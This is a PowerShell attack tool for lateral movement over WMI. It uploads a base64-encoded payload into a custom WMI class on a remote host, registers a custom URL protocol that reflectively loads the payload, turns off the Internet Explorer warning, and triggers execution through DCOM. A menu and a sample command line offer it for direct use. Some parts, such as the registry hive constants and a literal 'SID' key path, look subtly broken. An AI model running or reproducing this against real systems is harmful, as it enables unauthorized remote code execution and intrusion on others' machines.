param (
    [string]$remoteHost,
    [string]$payloadPath,
    [string]$username,
    [string]$password
)

function Get-Input {
    param (
        [string]$prompt
    )
    return Read-Host -Prompt $prompt
}

if (-not $remoteHost) {
    $remoteHost = Get-Input "Enter the remote host name or IP"
}
if (-not $payloadPath) {
    $payloadPath = Get-Input "Enter the local payload path"
}
if (-not $username) {
    $username = Get-Input "Enter the username"
}
if (-not $password) {
    $password = Get-Input "Enter the password"
}

function Create-URLProtocol {
    param (
        [string]$remoteHost
    )
    <#
    .SYNOPSIS
    Creates a custom URL protocol on the remote host.
    .PARAMETER remoteHost
    The name or IP address of the remote host.
    #>
    
    $RemoteWaMI = [WMIClass] "\\$remoteHost\root\default:StdRegProv"
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye")
    $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye", "URL Protocol", $null)
    
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell")
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open")
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open\command")
    
    $cmd = "powershell -c `[System.Reflection.Assembly]::Load(([Convert]::FromBase64String((([WmiClass]'root\default:Win32_DataInfilClass').Properties['File'].Value))))"
    $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye\shell\open\command", $null, $cmd)
}

function Invoke-URLProtocol {
    param (
        [string]$remoteHost
    )
    <#
    .SYNOPSIS
    Invokes the custom URL protocol through Internet Explorer on the remote host.
    .PARAMETER remoteHost
    The name or IP address of the remote host.
    #>
    
    $ie = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("internetexplorer.application", "\\$remoteHost"))
    $ie.Navigate2("cye:blabla")
    $ie.Quit()
}

function Disable-IEWarning {
    param (
        [string]$remoteHost
    )
    <#
    .SYNOPSIS
    Disables the security warning for the custom URL protocol in Internet Explorer.
    .PARAMETER remoteHost
    The name or IP address of the remote host.
    #>
    
    $RemoteWami = [WMIClass]"\\$remoteHost\root\default:StdRegProv"
    $RemoteWami.CreateKey(2147483651, "SID\\Software\\Microsoft\\Internet Explorer\\ProtocolExecute\\cye")
    $RemoteWami.SetDWORDValue(2147483651, "SID\\Software\\Microsoft\\Internet Explorer\\ProtocolExecute\\cye", "WarnOnOpen", 0)
}

function Upload-And-ExecutePayload {
    param (
        [string]$remoteHost,
        [string]$payloadPath,
        [string]$username,
        [string]$password
    )
    <#
    .SYNOPSIS
    Uploads and executes a base64 encoded payload on the remote host.
    .PARAMETER remoteHost
    The name or IP address of the remote host.
    .PARAMETER payloadPath
    The local path of the payload to upload.
    .PARAMETER username
    The username for authentication.
    .PARAMETER password
    The password for authentication.
    #>
    
    $FileBytes = [IO.File]::ReadAllBytes($payloadPath)
    $EncodedFileContent = [Convert]::ToBase64String($FileBytes)

    $Options = New-Object System.Management.ConnectionOptions
    $Options.Username = $username
    $Options.Password = $password
    $Options.EnablePrivileges = $true

    $Connection = New-Object System.Management.ManagementScope
    $Connection.Path = "\\$remoteHost\root\default"
    $Connection.Options = $Options
    $Connection.Connect()

    $DataInfilClass = New-Object System.Management.ManagementClass($Connection, [String]::Empty, $null)
    $DataInfilClass['__CLASS'] = 'Win32_DataInfilClass'
    $DataInfilClass.Properties.Add('File', [System.Management.CimType]::String, $false)
    $DataInfilClass.Properties['File'].Value = $EncodedFileContent
    $DataInfilClass.Put()

    $cmd = "powershell -c `[System.Reflection.Assembly]::Load((`[Convert]::FromBase64String((([WmiClass]'root\\default:Win32_DataInfilClass').Properties['File'].Value))))`"
    
    $RemoteWaMI = [WMIClass]"\\$remoteHost\root\default:StdRegProv"
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye")
    $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye", "URL Protocol", $null)
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell")
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open")
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open\command")
    $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye\shell\open\command", $null, $cmd)
}

function Show-Menu {
    <#
    .SYNOPSIS
    Displays a menu for user selection of options.
    #>
    Write-Host "`nSelect an option:"
    Write-Host "1. Create custom URL protocol"
    Write-Host "2. Invoke URL protocol through IE (DCOM)"
    Write-Host "3. Disable IE warnings for protocol"
    Write-Host "4. Upload and execute payload"
    Write-Host "5. Exit"
}

do {
    Show-Menu
    $choice = Read-Host "Enter your choice"

    switch ($choice) {
        1 {
            $remoteHost = Read-Host "Enter the remote host name or IP"
            Create-URLProtocol -remoteHost $remoteHost
        }
        2 {
            $remoteHost = Read-Host "Enter the remote host name or IP"
            Invoke-URLProtocol -remoteHost $remoteHost
        }
        3 {
            $remoteHost = Read-Host "Enter the remote host name or IP"
            Disable-IEWarning -remoteHost $remoteHost
        }
        4 {
            $remoteHost = Read-Host "Enter the remote host name or IP"
            $payloadPath = Read-Host "Enter the local payload path"
            $username = Read-Host "Enter the username"
            $password = Read-Host "Enter the password"
            Upload-And-ExecutePayload -remoteHost $remoteHost -payloadPath $payloadPath -username $username -password $password
        }
        5 {
            Write-Host "Exiting..."
            break
        }
        default {
            Write-Host "Invalid option, please try again."
        }
    }
} while ($choice -ne 5)
#.\LazyOwnEvilWMI.ps1 -remoteHost "192.168.1.100" -payloadPath "C:\Users\Argen\Downloads\my_payload.exe" -username "admin" -password "password123"
# Thanks to the article that inspired this script :) Thanks https://blog.fndsec.net/2024/09/11/wmi-research-and-lateral-movement/